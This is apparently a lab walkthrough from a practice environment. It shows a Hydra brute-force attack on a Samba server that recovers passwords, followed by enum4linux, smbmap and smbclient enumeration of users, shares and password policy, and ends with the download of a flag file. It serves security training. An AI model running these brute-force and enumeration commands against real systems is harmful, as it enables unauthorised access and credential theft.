# Samba

## Brute Force

```bash
root@attackdefense:~# hydra -L username -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.245.160.3 smb
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-28 13:14:54
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 2018 login tries (l:2/p:1009), ~2018 tries per task
[DATA] attacking smb://192.245.160.3:445/
[445][smb] host: 192.245.160.3   login: admin   password: password1
[445][smb] host: 192.245.160.3   login: jane   password: abc123
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-28 13:14:55
```

## Enumeration

```bash
root@attackdefense:~# smbmap -H 192.245.160.3 -uadmin -ppassword1
[+] Finding open SMB ports....
[+] User SMB session establishd on 192.245.160.3...
[+] IP: 192.245.160.3:445       Name: target-1
        Disk                                                    Permissions
        ----                                                    -----------
        shawn                                                   READ, WRITE
        nancy                                                   READ ONLY
        admin                                                   READ, WRITE
        IPC$                                                    NO ACCESS
```

```bash
root@attackdefense:~# smbclient -L  192.245.160.3 -Uadmin
Enter WORKGROUP\admin's password:

        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk
        nancy           Disk
        admin           Disk
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS
```

```bash
root@attackdefense:~# enum4linux -u admin -ppassword1 -a 192.245.160.3
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jan 28 13:22:46 2024

 ==========================
|    Target Information    |
 ==========================
Target ........... 192.245.160.3
RID Range ........ 500-550,1000-1050
Username ......... 'admin'
Password ......... 'password1'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =====================================================
|    Enumerating Workgroup/Domain on 192.245.160.3    |
 =====================================================
[+] Got domain/workgroup name: RECONLABS

 =============================================
|    Nbtstat Information for 192.245.160.3    |
 =============================================
Looking up status of 192.245.160.3
        RECONLABS       <00> - <GROUP> H <ACTIVE>  Domain/Workgroup Name
        RECONLABS       <1e> - <GROUP> H <ACTIVE>  Browser Service Elections
        SAMBA-RECON-BRU <00> -         H <ACTIVE>  Workstation Service
        SAMBA-RECON-BRU <03> -         H <ACTIVE>  Messenger Service
        SAMBA-RECON-BRU <20> -         H <ACTIVE>  File Server Service

        MAC Address = 00-00-00-00-00-00

 ======================================
|    Session Check on 192.245.160.3    |
 ======================================
[+] Server 192.245.160.3 allows sessions using username 'admin', password 'password1'

 ============================================
|    Getting domain SID for 192.245.160.3    |
 ============================================
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =======================================
|    OS information on 192.245.160.3    |
 =======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.245.160.3 from smbclient:
[+] Got OS info for 192.245.160.3 from srvinfo:
        SAMBA-RECON-BRUWk Sv PrQ Unx NT SNT brute.samba.recon.lab
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ==============================
|    Users on 192.245.160.3    |
 ==============================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: shawn    Name:   Desc:
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: nancy    Name:   Desc:
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: jane     Name:   Desc:
index: 0x4 RID: 0x3eb acb: 0x00000010 Account: admin    Name:   Desc:

user:[shawn] rid:[0x3e8]
user:[nancy] rid:[0x3ea]
user:[jane] rid:[0x3e9]
user:[admin] rid:[0x3eb]

 ==========================================
|    Share Enumeration on 192.245.160.3    |
 ==========================================

        Sharename       Type      Comment
        ---------       ----      -------
        shawn           Disk
        nancy           Disk
        admin           Disk
        IPC$            IPC       IPC Service (brute.samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS

[+] Attempting to map shares on 192.245.160.3
//192.245.160.3/shawn   Mapping: OK, Listing: OK
//192.245.160.3/nancy   Mapping: OK, Listing: OK
//192.245.160.3/admin   Mapping: OK, Listing: OK
//192.245.160.3/IPC$    [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 =====================================================
|    Password Policy Information for 192.245.160.3    |
 =====================================================


[+] Attaching to 192.245.160.3 using admin:password1

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] SAMBA-RECON-BRUTE
        [+] Builtin

[+] Password Info for Domain: SAMBA-RECON-BRUTE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes
        [+] Locked Account Duration: 30 minutes
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 ===============================
|    Groups on 192.245.160.3    |
 ===============================

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:
group:[Testing] rid:[0x3ee]

[+] Getting local group memberships:

[+] Getting domain groups:
group:[Maintainer] rid:[0x3ec]
group:[Reserved] rid:[0x3ed]

[+] Getting domain group memberships:

 ========================================================================
|    Users on 192.245.160.3 via RID cycling (RIDS: 500-550,1000-1050)    |
 ========================================================================
[I] Found new SID: S-1-22-2
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3690628376-3985617143-2159776750
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username 'admin', password 'password1'
S-1-22-1-1000 Unix User\shawn (Local User)
S-1-22-1-1001 Unix User\jane (Local User)
S-1-22-1-1002 Unix User\nancy (Local User)
S-1-22-1-1003 Unix User\admin (Local User)
[+] Enumerating users using SID S-1-22-2 and logon username 'admin', password 'password1'
S-1-22-2-1000 Unix Group\admins (Domain Group)
S-1-22-2-1001 Unix Group\Maintainer (Domain Group)
S-1-22-2-1002 Unix Group\Reserved (Domain Group)
S-1-22-2-1003 Unix Group\Testing (Domain Group)
[+] Enumerating users using SID S-1-5-32 and logon username 'admin', password 'password1'
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
...
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
...
[+] Enumerating users using SID S-1-5-21-3690628376-3985617143-2159776750 and logon username 'admin', password 'password1'
S-1-5-21-3690628376-3985617143-2159776750-500 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-501 SAMBA-RECON-BRUTE\nobody (Local User)
S-1-5-21-3690628376-3985617143-2159776750-502 *unknown*\*unknown* (8)
S-1-5-21-3690628376-3985617143-2159776750-503 *unknown*\*unknown* (8)
...
S-1-5-21-3690628376-3985617143-2159776750-1000 SAMBA-RECON-BRUTE\shawn (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1001 SAMBA-RECON-BRUTE\jane (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1002 SAMBA-RECON-BRUTE\nancy (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1003 SAMBA-RECON-BRUTE\admin (Local User)
S-1-5-21-3690628376-3985617143-2159776750-1004 SAMBA-RECON-BRUTE\Maintainer (Domain Group)
S-1-5-21-3690628376-3985617143-2159776750-1005 SAMBA-RECON-BRUTE\Reserved (Domain Group)
...

 ==============================================
|    Getting printer info for 192.245.160.3    |
 ==============================================
No printers returned.


enum4linux complete on Sun Jan 28 13:23:04 2024
```

## Connect

```bash
root@attackdefense:~# smbclient //192.245.160.3/admin -U admin
Enter WORKGROUP\admin's password:
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Sun Jan 28 13:16:46 2024
  ..                                  D        0  Tue Nov 27 19:25:12 2018
  hidden                              D        0  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 181372432 blocks available

smb: \> cd hidden\

smb: \hidden\> ls
  .                                   D        0  Tue Nov 27 19:25:12 2018
  ..                                  D        0  Sun Jan 28 13:16:46 2024
  flag.tar.gz                         N      151  Tue Nov 27 19:25:12 2018

                1981084628 blocks of size 1024. 181372424 blocks available
smb: \hidden\> get flag.tar.gz
getting file \hidden\flag.tar.gz of size 151 as flag.tar.gz (1510000.0 KiloBytes/sec) (average inf KiloBytes/sec)
```
